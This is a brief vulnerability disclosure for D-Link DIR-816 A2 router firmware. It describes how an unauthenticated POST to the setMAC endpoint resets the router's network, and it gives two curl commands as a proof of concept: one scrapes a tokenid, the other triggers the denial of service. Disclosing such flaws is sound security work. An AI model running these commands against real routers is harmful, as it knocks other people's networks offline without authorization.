# D-link DIR-816 A2_v1.10CNB04.img Network reset without authentication

## Firmware information

- Manufacturer's address：https://www.dlink.com/

- Firmware download address ： http://tsd.dlink.com.tw/GPL.asp

## Affected version

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/dir816/img/vuln2.png)

The picture above shows the latest firmware for this version

## Vulnerability details

![](https://github.com/z1r00/IOT_Vul/blob/main/dlink/Dir816/setmac/img/vuln1.png)

As shown above, in any case, you can go to the initInternet function to reset the network. At this time, the local area network will stop serving.

## Poc

The first thing you need to do is to get the tokenid
```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Then run the following poc
```
curl -i -X POST http://192.168.0.1/goform/setMAC -d tokenid=xxxxx
```
The router will then reset the network
